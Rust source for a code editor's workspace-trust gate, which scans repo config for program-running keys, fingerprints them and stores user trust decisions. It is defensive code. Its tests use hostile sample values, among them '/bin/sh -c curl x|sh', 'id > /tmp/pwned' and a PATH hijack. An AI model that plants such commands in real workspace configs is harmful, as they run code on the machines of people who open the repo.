//! Workspace trust — the gate in front of every config key that can
//! execute a program on mnml's behalf.
//!
//! ## Why this exists
//!
//! `Config::load` layers `<workspace>/.mnml/config.toml` over the user's
//! global config, and several of those keys name a binary mnml then runs
//! (see [`ExecKind`]). Without a gate, cloning a repo and opening it was
//! arbitrary code execution: `[lsp.x] cmd = "/bin/sh"` fires the moment
//! you open a matching file, `[[startup.layout]] kind = "pty"` fires at
//! startup with no interaction at all. Both were verified end-to-end
//! against a real build on 2026-08-25.
//!
//! The `.test` runner already default-denied `shell` steps for exactly
//! this threat (`src/e2e/mod.rs`) — this module generalises that stance
//! to the config layer.
//!
//! ## Design
//!
//! Unlike VS Code, which asks about every folder because its risky
//! surface is diffuse (tasks, extensions, debug configs), mnml's is a
//! short enumerable list. So we *scan* first and only ask when the
//! workspace actually declares something executable. A repo with no
//! `.mnml/` — overwhelmingly the common case — never prompts, which is
//! what keeps the prompt meaningful when it does appear.
//!
//! Untrusted is not a refusal to open. The exec-bearing keys are simply
//! dropped from the workspace layer; global config still supplies them,
//! and editing / git / search / LSP-from-global all work normally. That
//! makes "Don't trust" a cheap, reversible answer rather than one that
//! costs the user their editor.
//!
//! ## Fingerprinting
//!
//! Trust is recorded as `(canonical path, fingerprint)` where the
//! fingerprint covers the exec-bearing claims only. Trusting a workspace
//! today therefore does NOT auto-trust whatever a later `git pull`
//! introduces — the claims change, the fingerprint changes, and mnml
//! asks again. Cosmetic edits to unrelated config keys don't re-prompt.
//!
//! The store lives in the user config dir, never in the workspace: a
//! trust record inside `.mnml/` would be attacker-writable. Paths are
//! canonicalized so a symlink can't launder an untrusted directory into
//! a trusted one.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

/// Which executable-bearing config key a claim came from. Each variant
/// corresponds to a sink that ends in `Command::new` or `$SHELL -c`.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum ExecKind {
    /// `[lsp.<name>] cmd` / `args` → `LspClient::spawn`. Fires on
    /// `did_open` for a matching extension — i.e. opening any file.
    LanguageServer,
    /// `[formatters.<ext>] cmd` → `$SHELL -c` on format (and on save
    /// when `format_on_save` is set).
    Formatter,
    /// `[ui] md_preview_engine = "custom:<cmd>"` → `sh -c`.
    MdPreview,
    /// `[[startup.layout]] kind = "pty"` → `$SHELL -c` at startup, with
    /// no user interaction whatsoever.
    StartupPty,
    /// `<workspace>/.mnml/integrations/*.toml` — registers commands and
    /// supplies `[env]` for spawns (so `PATH` / `DYLD_INSERT_LIBRARIES`
    /// are in play, not just the command itself).
    Integration,
}

impl ExecKind {
    /// Human label for the trust dialog's bullet list.
    pub fn label(self) -> &'static str {
        match self {
            Self::LanguageServer => "language server",
            Self::Formatter => "format on save",
            Self::MdPreview => "markdown preview",
            Self::StartupPty => "run at startup",
            Self::Integration => "integration",
        }
    }

    /// When this fires, in the user's terms — the dialog says this so
    /// the reader can judge urgency without knowing mnml's internals.
    pub fn trigger(self) -> &'static str {
        match self {
            Self::LanguageServer => "when you open a file",
            Self::Formatter => "when you save",
            Self::MdPreview => "when you preview markdown",
            Self::StartupPty => "immediately, on open",
            Self::Integration => "when you click its chip",
        }
    }
}

/// One executable thing a workspace's config declares.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
pub struct ExecClaim {
    pub kind: ExecKind,
    /// The config key it came from (`lsp.rust`, `formatters.rs`, …).
    pub key: String,
    /// The command as it would run, rendered for display. Shown to the
    /// user verbatim — a hostile `sh -c "curl … | sh"` should be
    /// self-evident, and a benign `rust-analyzer` equally so.
    pub command: String,
}

impl ExecClaim {
    /// The specific entry's name, without its section prefix —
    /// `claude_code` from `integrations.claude_code`, `rust` from
    /// `lsp.rust`. Shown in the trust dialog so a claim identifies
    /// WHICH entry it is, not just what category it falls in.
    ///
    /// Comes from the config key (the file stem for integrations),
    /// never from a manifest-supplied display label: that string is
    /// written by the workspace being judged, and a hostile repo
    /// could choose a reassuring one to dress up the prompt.
    pub fn entry_name(&self) -> &str {
        match self.key.split_once('.') {
            Some((_, rest)) if !rest.is_empty() => rest,
            _ => &self.key,
        }
    }

    /// Stable one-line form used for both the fingerprint and tests.
    fn canonical(&self) -> String {
        format!("{:?}\u{1f}{}\u{1f}{}", self.kind, self.key, self.command)
    }
}

/// Scan a workspace's `.mnml/` for everything that can execute.
///
/// Best-effort and non-fatal: an unreadable or malformed file yields no
/// claims rather than an error. That is the safe direction — a file mnml
/// can't parse is also one it can't execute from.
pub fn scan(workspace: &Path) -> Vec<ExecClaim> {
    let mut out = Vec::new();
    let mnml_dir = workspace.join(".mnml");
    scan_config(&mnml_dir.join("config.toml"), &mut out);
    scan_integrations(&mnml_dir.join("integrations"), &mut out);
    out.sort();
    out.dedup();
    out
}

fn scan_config(path: &Path, out: &mut Vec<ExecClaim>) {
    let Ok(text) = std::fs::read_to_string(path) else {
        return;
    };
    let Ok(doc) = toml::from_str::<toml::Value>(&text) else {
        return;
    };

    // [lsp.<name>] cmd / args
    if let Some(lsp) = doc.get("lsp").and_then(|v| v.as_table()) {
        for (name, val) in lsp {
            let Some(t) = val.as_table() else { continue };
            // A table with no `cmd` inherits the builtin binary and only
            // overrides extensions/root_markers — nothing new executes,
            // so it isn't a claim.
            let Some(cmd) = t.get("cmd").and_then(|v| v.as_str()) else {
                continue;
            };
            let args: Vec<String> = t
                .get("args")
                .and_then(|v| v.as_array())
                .map(|a| {
                    a.iter()
                        .filter_map(|v| v.as_str().map(str::to_string))
                        .collect()
                })
                .unwrap_or_default();
            let rendered = if args.is_empty() {
                cmd.to_string()
            } else {
                format!("{cmd} {}", args.join(" "))
            };
            out.push(ExecClaim {
                kind: ExecKind::LanguageServer,
                key: format!("lsp.{name}"),
                command: rendered,
            });
        }
    }

    // [formatters.<ext>] cmd — string or list-of-strings.
    if let Some(fmts) = doc.get("formatters").and_then(|v| v.as_table()) {
        for (ext, val) in fmts {
            let Some(t) = val.as_table() else { continue };
            let Some(cmd) = t.get("cmd") else { continue };
            let rendered = match cmd {
                toml::Value::String(s) => s.clone(),
                toml::Value::Array(a) => a
                    .iter()
                    .filter_map(|v| v.as_str())
                    .collect::<Vec<_>>()
                    .join(" · "),
                _ => continue,
            };
            if rendered.trim().is_empty() {
                continue;
            }
            out.push(ExecClaim {
                kind: ExecKind::Formatter,
                key: format!("formatters.{ext}"),
                command: rendered,
            });
        }
    }

    // [ui] md_preview_engine = "custom:<cmd>" — only the custom form
    // executes; "builtin" / "glow" / "pandoc" name vetted paths.
    if let Some(engine) = doc
        .get("ui")
        .and_then(|u| u.get("md_preview_engine"))
        .and_then(|v| v.as_str())
        && let Some(cmd) = engine.strip_prefix("custom:")
        && !cmd.trim().is_empty()
    {
        out.push(ExecClaim {
            kind: ExecKind::MdPreview,
            key: "ui.md_preview_engine".to_string(),
            command: cmd.to_string(),
        });
    }

    // [[startup.layout]] kind = "pty" — the no-interaction sink.
    if let Some(entries) = doc
        .get("startup")
        .and_then(|s| s.get("layout"))
        .and_then(|v| v.as_array())
    {
        for entry in entries {
            let Some(t) = entry.as_table() else { continue };
            if t.get("kind").and_then(|v| v.as_str()) != Some("pty") {
                continue;
            }
            let Some(cmd) = t.get("cmd").and_then(|v| v.as_str()) else {
                continue;
            };
            if cmd.trim().is_empty() {
                continue;
            }
            out.push(ExecClaim {
                kind: ExecKind::StartupPty,
                key: "startup.layout".to_string(),
                command: cmd.to_string(),
            });
        }
    }
}

fn scan_integrations(dir: &Path, out: &mut Vec<ExecClaim>) {
    let Ok(entries) = std::fs::read_dir(dir) else {
        return;
    };
    for entry in entries.flatten() {
        let path = entry.path();
        if path.extension().and_then(|s| s.to_str()) != Some("toml") {
            continue;
        }
        let Ok(text) = std::fs::read_to_string(&path) else {
            continue;
        };
        let Ok(doc) = toml::from_str::<toml::Value>(&text) else {
            continue;
        };
        let name = path
            .file_stem()
            .and_then(|s| s.to_str())
            .unwrap_or("unknown")
            .to_string();

        // A `[[commands]]` block registers runnable commands.
        let cmds: Vec<String> = doc
            .get("commands")
            .and_then(|v| v.as_array())
            .map(|a| {
                a.iter()
                    .filter_map(|c| c.get("command").and_then(|v| v.as_str()))
                    .map(str::to_string)
                    .collect()
            })
            .unwrap_or_default();
        // `launcher` overrides the binary; `[env]` shapes the spawn's
        // environment, which is exec-relevant on its own (PATH,
        // DYLD_INSERT_LIBRARIES, GIT_SSH_COMMAND).
        let launcher = doc
            .get("launcher")
            .and_then(|v| v.as_str())
            .map(str::to_string);
        // `[[launch_profile]] command` — the named-profile form that
        // superseded the single `launcher` key (#1203). Missing it was
        // a real bypass: a manifest carrying ONLY launch profiles
        // produced no claims, so the workspace scanned as harmless and
        // its commands loaded ungated.
        let profiles: Vec<String> = doc
            .get("launch_profile")
            .and_then(|v| v.as_array())
            .map(|a| {
                a.iter()
                    .filter_map(|p| {
                        let cmd = p.get("command").and_then(|v| v.as_str())?;
                        let name = p.get("name").and_then(|v| v.as_str()).unwrap_or("?");
                        Some(format!("{name}: {cmd}"))
                    })
                    .collect()
            })
            .unwrap_or_default();
        let env_keys: Vec<String> = doc
            .get("env")
            .and_then(|v| v.as_table())
            .map(|t| t.keys().cloned().collect())
            .unwrap_or_default();

        if cmds.is_empty() && launcher.is_none() && profiles.is_empty() && env_keys.is_empty() {
            continue;
        }
        let mut parts = Vec::new();
        if let Some(l) = launcher {
            parts.push(format!("launcher: {l}"));
        }
        if !profiles.is_empty() {
            parts.push(profiles.join(" · "));
        }
        if !cmds.is_empty() {
            parts.push(cmds.join(" · "));
        }
        if !env_keys.is_empty() {
            parts.push(format!("env: {}", env_keys.join(", ")));
        }
        out.push(ExecClaim {
            kind: ExecKind::Integration,
            key: format!("integrations.{name}"),
            command: parts.join(" | "),
        });
    }
}

/// Stable digest of a claim set. Same claims ⇒ same fingerprint across
/// runs and machines, so a trust record survives restarts but not a
/// change to what the workspace wants to execute.
///
/// FNV-1a: no dependency, and the threat model doesn't need collision
/// resistance against a determined attacker — an attacker who can edit
/// the workspace config to forge a fingerprint match can already edit
/// the config, which is the thing being gated. The fingerprint exists to
/// notice *change*, not to authenticate.
pub fn fingerprint(claims: &[ExecClaim]) -> String {
    let mut hash: u64 = 0xcbf2_9ce4_8422_2325;
    for claim in claims {
        for byte in claim.canonical().bytes() {
            hash ^= byte as u64;
            hash = hash.wrapping_mul(0x100_0000_01b3);
        }
        hash ^= b'\n' as u64;
        hash = hash.wrapping_mul(0x100_0000_01b3);
    }
    format!("{hash:016x}")
}

/// `~/.config/mnml/trusted_workspaces.toml`. Deliberately in the user
/// config dir — a store inside the workspace would be writable by the
/// same repo it's meant to gate.
fn store_path() -> Option<PathBuf> {
    let cfg = crate::config::user_config_path()?;
    Some(cfg.parent()?.join("trusted_workspaces.toml"))
}

/// Canonicalized workspace path, used as the store key so a symlink
/// can't launder an untrusted directory into a trusted one.
fn store_key(workspace: &Path) -> String {
    workspace
        .canonicalize()
        .unwrap_or_else(|_| workspace.to_path_buf())
        .display()
        .to_string()
}

fn read_store() -> BTreeMap<String, String> {
    let Some(path) = store_path() else {
        return BTreeMap::new();
    };
    let Ok(text) = std::fs::read_to_string(path) else {
        return BTreeMap::new();
    };
    toml::from_str::<BTreeMap<String, String>>(&text).unwrap_or_default()
}

/// True when this workspace has been trusted AND its exec-bearing
/// claims still match what was trusted. A changed fingerprint reads as
/// untrusted, so an upstream change re-prompts rather than inheriting
/// the old decision.
pub fn is_trusted(workspace: &Path, fp: &str) -> bool {
    read_store().get(&store_key(workspace)).map(String::as_str) == Some(fp)
}

/// Scan, fingerprint, and check the store in one call — "may this
/// workspace's config run things?".
///
/// A workspace that declares nothing executable is trivially trusted:
/// there is no decision to make and nothing to gate.
///
/// Every consumer of workspace-supplied exec config must route through
/// this. It exists because the check was open-coded in two places and
/// a third path — `launch_profiles::LaunchProfiles::load`, which reads
/// `<ws>/.mnml/integrations/<id>.toml` with a plain `read_to_string` —
/// was missed entirely, so a repo's `[[launch_profile]] command` still
/// ran after the user declined to trust it.
pub fn is_workspace_trusted(workspace: &Path) -> bool {
    let claims = scan(workspace);
    claims.is_empty() || is_trusted(workspace, &fingerprint(&claims))
}

/// Record trust for `workspace` at fingerprint `fp`.
pub fn trust(workspace: &Path, fp: &str) -> Result<(), String> {
    let Some(path) = store_path() else {
        return Err("no user config dir".to_string());
    };
    let mut store = read_store();
    store.insert(store_key(workspace), fp.to_string());
    write_store(&path, &store)
}

/// Forget a previous trust decision (`workspace.revoke_trust`).
pub fn revoke(workspace: &Path) -> Result<(), String> {
    let Some(path) = store_path() else {
        return Err("no user config dir".to_string());
    };
    let mut store = read_store();
    store.remove(&store_key(workspace));
    write_store(&path, &store)
}

fn write_store(path: &Path, store: &BTreeMap<String, String>) -> Result<(), String> {
    if let Some(dir) = path.parent() {
        std::fs::create_dir_all(dir).map_err(|e| format!("{}: {e}", dir.display()))?;
    }
    let body = toml::to_string(store).map_err(|e| format!("serialize: {e}"))?;
    let header = "# Workspaces you've allowed to run programs declared in their\n\
                  # own .mnml/ config (language servers, formatters, startup\n\
                  # commands). Key = canonical path, value = a fingerprint of\n\
                  # what was approved — if the workspace's config changes,\n\
                  # mnml asks again. Delete a line to revoke.\n\n";
    std::fs::write(path, format!("{header}{body}")).map_err(|e| format!("{}: {e}", path.display()))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ws_with_config(body: &str) -> tempfile::TempDir {
        let d = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(d.path().join(".mnml")).unwrap();
        std::fs::write(d.path().join(".mnml/config.toml"), body).unwrap();
        d
    }

    #[test]
    fn workspace_without_mnml_dir_makes_no_claims() {
        // The common case — a cloned repo that has never seen mnml.
        // Must produce zero claims so the user is never prompted.
        let d = tempfile::tempdir().unwrap();
        assert!(scan(d.path()).is_empty());
    }

    #[test]
    fn benign_config_without_exec_keys_makes_no_claims() {
        let d = ws_with_config("[ui]\ntheme = \"gruvbox\"\n[editor]\ninput_style = \"vim\"\n");
        assert!(scan(d.path()).is_empty());
    }

    #[test]
    fn lsp_cmd_is_claimed_with_args_rendered() {
        let d = ws_with_config(
            "[lsp.evil]\ncmd = \"/bin/sh\"\nargs = [\"-c\", \"curl x|sh\"]\nextensions = [\"rs\"]\n",
        );
        let claims = scan(d.path());
        assert_eq!(claims.len(), 1);
        assert_eq!(claims[0].kind, ExecKind::LanguageServer);
        assert_eq!(claims[0].command, "/bin/sh -c curl x|sh");
    }

    #[test]
    fn lsp_table_without_cmd_is_not_a_claim() {
        // Overriding only `extensions` reuses the builtin binary, so
        // nothing new executes.
        let d = ws_with_config("[lsp.rust]\nextensions = [\"rs\", \"rsx\"]\n");
        assert!(scan(d.path()).is_empty());
    }

    #[test]
    fn startup_pty_is_claimed_but_editor_entries_are_not() {
        let d = ws_with_config(
            "[[startup.layout]]\nkind = \"pty\"\ncmd = \"id > /tmp/pwned\"\n\n\
             [[startup.layout]]\nkind = \"editor\"\npath = \"README.md\"\nsplit = \"right\"\n",
        );
        let claims = scan(d.path());
        assert_eq!(claims.len(), 1);
        assert_eq!(claims[0].kind, ExecKind::StartupPty);
    }

    #[test]
    fn md_preview_custom_is_claimed_but_builtin_is_not() {
        let d = ws_with_config("[ui]\nmd_preview_engine = \"custom:evil.sh\"\n");
        assert_eq!(scan(d.path()).len(), 1);
        let d2 = ws_with_config("[ui]\nmd_preview_engine = \"builtin\"\n");
        assert!(scan(d2.path()).is_empty());
    }

    #[test]
    fn formatter_cmd_accepts_string_and_list_forms() {
        let d = ws_with_config("[formatters.rs]\ncmd = \"rustfmt\"\n");
        assert_eq!(scan(d.path()).len(), 1);
        let d2 = ws_with_config("[formatters.js]\ncmd = [\"prettier\", \"--write\"]\n");
        assert_eq!(scan(d2.path()).len(), 1);
    }

    #[test]
    fn malformed_config_yields_no_claims_rather_than_panicking() {
        let d = ws_with_config("this is not [valid toml @@@");
        assert!(scan(d.path()).is_empty());
    }

    #[test]
    fn fingerprint_is_stable_and_change_sensitive() {
        let d = ws_with_config("[lsp.a]\ncmd = \"rust-analyzer\"\n");
        let a = fingerprint(&scan(d.path()));
        assert_eq!(a, fingerprint(&scan(d.path())), "must be deterministic");

        // Same file, different command ⇒ different fingerprint, so a
        // later `git pull` that swaps the binary re-prompts.
        let d2 = ws_with_config("[lsp.a]\ncmd = \"/bin/sh\"\n");
        assert_ne!(a, fingerprint(&scan(d2.path())));
    }

    #[test]
    fn fingerprint_ignores_unrelated_config_edits() {
        // Cosmetic churn must not re-prompt a workspace you trusted.
        let d = ws_with_config("[lsp.a]\ncmd = \"rust-analyzer\"\n");
        let a = fingerprint(&scan(d.path()));
        let d2 = ws_with_config("[ui]\ntheme = \"nord\"\n[lsp.a]\ncmd = \"rust-analyzer\"\n");
        assert_eq!(a, fingerprint(&scan(d2.path())));
    }

    #[test]
    fn empty_claim_set_fingerprints_consistently() {
        let d = tempfile::tempdir().unwrap();
        assert_eq!(fingerprint(&scan(d.path())), fingerprint(&[]));
    }

    /// Run `f` with the trust store redirected into a temp dir, so no
    /// test ever touches the developer's real `~/.config/mnml/`.
    ///
    /// Uses the crate-wide `test_env_lock()` + `EnvGuard`, which exist
    /// for exactly this (see `lib.rs` — added 2026-08-03 after an
    /// Ubuntu-CI flake of the same shape). A module-local lock would
    /// be internally consistent while still racing every other module
    /// that mutates env.
    fn with_isolated_store<T>(f: impl FnOnce() -> T) -> T {
        let _lk = crate::test_env_lock()
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let home = tempfile::tempdir().unwrap();
        let _root = crate::EnvGuard::set("MNML_DATA_ROOT", home.path());
        f()
    }

    #[test]
    fn trust_round_trips_and_is_scoped_to_the_fingerprint() {
        with_isolated_store(|| {
            let d = ws_with_config("[lsp.a]\ncmd = \"rust-analyzer\"\n");
            let claims = scan(d.path());
            let fp = fingerprint(&claims);

            assert!(!is_trusted(d.path(), &fp), "untrusted before granting");
            trust(d.path(), &fp).unwrap();
            assert!(is_trusted(d.path(), &fp), "trusted after granting");

            // The whole point of fingerprinting: trusting the workspace
            // today must NOT bless a command a later pull introduces.
            let changed = fingerprint(&[ExecClaim {
                kind: ExecKind::LanguageServer,
                key: "lsp.a".into(),
                command: "/bin/sh -c curl|sh".into(),
            }]);
            assert!(!is_trusted(d.path(), &changed), "changed claims re-prompt");

            revoke(d.path()).unwrap();
            assert!(!is_trusted(d.path(), &fp), "revoke sticks");
        });
    }

    #[test]
    fn trust_is_per_workspace() {
        with_isolated_store(|| {
            let a = ws_with_config("[lsp.a]\ncmd = \"rust-analyzer\"\n");
            let b = ws_with_config("[lsp.a]\ncmd = \"rust-analyzer\"\n");
            let fp = fingerprint(&scan(a.path()));
            trust(a.path(), &fp).unwrap();
            // Identical config, different directory — trusting one must
            // not silently trust the other.
            assert!(is_trusted(a.path(), &fp));
            assert!(!is_trusted(b.path(), &fp));
        });
    }

    #[test]
    fn entry_name_strips_the_section_prefix() {
        let claim = |k: &str| ExecClaim {
            kind: ExecKind::Integration,
            key: k.to_string(),
            command: "x".into(),
        };
        assert_eq!(
            claim("integrations.claude_code").entry_name(),
            "claude_code"
        );
        assert_eq!(claim("lsp.rust").entry_name(), "rust");
        assert_eq!(claim("formatters.rs").entry_name(), "rs");
        // Dotless keys (`startup.layout` is prefixed, `ui.md_preview_engine`
        // too) still return something usable rather than empty.
        assert_eq!(claim("standalone").entry_name(), "standalone");
        assert_eq!(claim("trailing.").entry_name(), "trailing.");
    }

    #[test]
    fn integration_launch_profile_is_a_claim() {
        // Regression guard for a bypass found against a real manifest
        // (mnml's own `.mnml/integrations/claude_code.toml`): the
        // named-profile form carries the command, and a manifest with
        // ONLY launch profiles must not scan as harmless.
        let d = tempfile::tempdir().unwrap();
        let dir = d.path().join(".mnml/integrations");
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(
            dir.join("claude_code.toml"),
            "default_profile = \"multi-repo\"\n\
             [[launch_profile]]\nname = \"multi-repo\"\ncommand = \"/tmp/evil.sh\"\n",
        )
        .unwrap();
        let claims = scan(d.path());
        assert_eq!(claims.len(), 1, "launch_profile must be claimed");
        assert_eq!(claims[0].kind, ExecKind::Integration);
        assert!(claims[0].command.contains("/tmp/evil.sh"));
    }

    #[test]
    fn integration_env_block_alone_is_a_claim() {
        // `[env]` shapes the spawn (PATH, DYLD_INSERT_LIBRARIES), so
        // it's exec-relevant even with no explicit command.
        let d = tempfile::tempdir().unwrap();
        let dir = d.path().join(".mnml/integrations");
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(
            dir.join("jira.toml"),
            "id = \"jira\"\n[env]\nPATH = \"/tmp/evil\"\n",
        )
        .unwrap();
        let claims = scan(d.path());
        assert_eq!(claims.len(), 1);
        assert_eq!(claims[0].kind, ExecKind::Integration);
        assert!(claims[0].command.contains("PATH"));
    }
}
